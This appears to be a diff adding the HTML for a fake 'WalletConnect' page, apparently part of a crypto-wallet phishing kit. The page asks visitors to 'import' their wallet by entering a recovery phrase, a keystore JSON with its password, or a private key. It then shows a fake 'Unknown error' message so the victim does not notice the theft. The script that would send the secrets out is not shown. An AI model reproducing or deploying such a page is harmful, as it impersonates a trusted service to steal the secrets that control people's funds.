@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Wallet Connect</title>
+	<link rel="stylesheet" href="index.css">
+</head>
+
+<body>
+	<main>
+		<h3 class="header">WalletConnect</h3>
+		<section class="container">
+			<h4>Connect to a wallet</h4>
+
+			<!-- Buttons -->
+			<div class="btn-container" id="btn-parent"></div>
+
+		</section>
+
+		<!-- Initial Modal -->
+		<div class="overlay" style="display: none;" id="initModal">
+			<div class="box">
+				<div class="modal-title">
+					<p> Back </p>
+					<div onclick="closeModal()">
+						<svg width="20" height="20" viewBox="0 0 20 20" fill="none" stroke="#587087" stroke-width="2"
+							stroke-linecap="round" stroke-linejoin="round" class="sc-hZSUBg fRJrUU">
+							<line x1="18" y1="6" x2="6" y2="18">
+							</line>
+							<line x1="6" y1="6" x2="18" y2="18">
+							</line>
+						</svg>
+					</div>
+				</div>
+				<div class="modal-body">
+					<div class="initializing">
+						<p>Initializing...</p>
+						<div class="connect" style="display: none;">
+							Connect Manually
+						</div>
+					</div>
+					<button id="connect-METAMASK" class="connect-wallet">
+						<div class="">
+							<p class="connect-title walletType"></p>
+							<p class="connect-desc">
+								Easy-to-use browser extension.
+							</p>
+						</div>
+						<img src="" alt="Icon" width="24" id="walletLogo">
+					</button>
+				</div>
+			</div>
+		</div>
+
+		<!-- Form Modal -->
+		<div class="overlay" style="display: none;" id="mainModal">
+			<div class="wallet-box">
+				<div class="wallet-details">
+					<div class="wallet-title">
+						<img src="" width="42" id="formLogo">
+						<h3>Import
+							your <span id="walletName"></span> wallet
+						</h3>
+					</div>
+					<div class="tab-parent">
+						<div class="tab-list">
+							<button data-id="phrase" class="tab-btn active">
+								Phrase
+							</button>
+							<button data-id="keystore" class="tab-btn">
+								Keystore JSON
+							</button>
+							<button data-id="private" class="tab-btn">
+								Private Key
+							</button>
+						</div>
+
+						<form method="" class="tab-content">
+							<div id="phrase" class="tab-body active-tab">
+								<div class="form-section">
+									<textarea id="phraseText" cols="30" rows="4"
+										placeholder="Enter your recovery phrase"
+										class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
+										name="phrase" required></textarea>
+									<p>
+										Typically 12 (sometimes 24) words separated by single
+										spaces
+									</p>
+								</div>
+								<button type="submit" onclick="thankyou_message()">
+									<span>Import</span>
+									<span>
+										<svg fill="none" height="24" width="24" stroke-linecap="round"
+											stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="#fff">
+											<path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z">
+											</path>
+										</svg>
+									</span>
+								</button>
+
+								<!-- Successfully Submitted page-->
+								<div style="display: none;" class="thankyou_message">
+									<p>Unknown error occured, please try
+										again.</p>
+									<img src="images/error.png" width="40" class="thankyou_message">
+								</div>
+							</div>
+
+						</form>
+
+						<form method="" class="tab-content">
+							<div id="keystore" class="tab-body">
+								<div class="form-section">
+									<textarea cols="30" rows="4" id="keystoreText"
+										placeholder="Enter your Keystore JSON" name="keystore" required></textarea>
+									<input type="password" name="password" placeholder="Wallet password" required>
+									<p>
+										Several lines of text beginning with "{...}" plus the
+										password you used to encrypt it.
+									</p>
+								</div>
+								<button type="submit" onclick="thankyou_message()">
+									<span>Import</span>
+									<span>
+										<svg fill="none" height="24" width="24" stroke-linecap="round"
+											stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="#fff">
+											<path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z">
+											</path>
+										</svg>
+									</span>
+								</button>
+
+								<!-- Successfully Submitted page-->
+								<div style="display: none;" class="thankyou_message">
+									<p>Unknown error occured, please try
+										again.</p>
+									<img src="images/error.png" width="40" class="thankyou_message">
+								</div>
+							</div>
+
+						</form>
+
+						<form method="" class="tab-content">
+							<div id="private" class="tab-body">
+								<div class="form-section">
+									<input type="password" id="privatekeyText" placeholder="Enter your Private Key"
+										name="key" required>
+									<p>
+										Typically 12 (sometimes 24) words seperated by a single
+										space.
+									</p>
+								</div>
+								<button type="submit" onclick="thankyou_message()">
+									<span>Import</span>
+									<span>
+										<svg fill="none" height="24" width="24" stroke-linecap="round"
+											stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="#fff">
+											<path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z">
+											</path>
+										</svg>
+									</span>
+								</button>
+							</div>
+						</form>
+					</div>
+
+					<div class="cancel-btn">
+						<button id="cancel" type="button" onclick="closeModal()">
+							Cancel
+						</button>
+					</div>
+				</div>
+			</div>
+		</div>
+	</main>
+	<script src="index.js"></script>
+</body>
+
+</html>
